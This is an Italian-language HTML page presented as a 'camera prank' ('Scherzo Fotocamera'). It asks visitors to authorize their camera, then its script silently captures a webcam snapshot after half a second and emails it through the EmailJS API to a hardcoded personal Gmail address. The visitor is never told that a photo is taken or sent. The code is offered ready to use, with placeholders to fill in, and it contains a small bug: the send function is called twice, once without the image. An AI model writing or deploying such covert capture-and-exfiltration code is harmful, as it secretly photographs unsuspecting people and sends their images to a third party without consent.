<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scherzo Fotocamera</title>
</head>
<body>
    <h1>Benvenuto! Premi OK per autorizzare la fotocamera.</h1>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <script>
        // Richiesta permesso fotocamera
        async function getMedia() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;

                // Aspetta 0.5 secondi, scatta la foto e invia via email
                setTimeout(() => {
                    takeSnapshot();
                    sendEmail();
                }, 500); // 500 ms = 0.5 secondi
            } catch (error) {
                alert("Errore nel consentire l'accesso alla fotocamera.");
            }
        }

        // Funzione per scattare la foto
        function takeSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Converti la foto in formato base64
            const imgData = canvas.toDataURL('image/jpeg');
            sendEmail(imgData);
        }

        // Funzione per inviare la foto tramite EmailJS
        function sendEmail(imageData) {
            const formData = {
                service_id: "service_mrkzn2a",  // Sostituisci con il tuo ID del servizio EmailJS
                template_id: "template_mrkzn2a",  // Sostituisci con il tuo ID del template
                user_id: "user_XXXXXXX",  // Sostituisci con il tuo user ID di EmailJS
                message: imageData,
                to_email: "sharafomar834@gmail.com",  // La tua email
            };

            fetch('https://api.emailjs.com/api/v1.0/email/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Email inviata con successo', data);
            })
            .catch(error => {
                console.error('Errore nell\'invio dell\'email', error);
            });
        }

        // Inizializza la fotocamera quando la pagina è caricata
        window.onload = () => {
            getMedia();
        };
    </script>
</body>
</html>
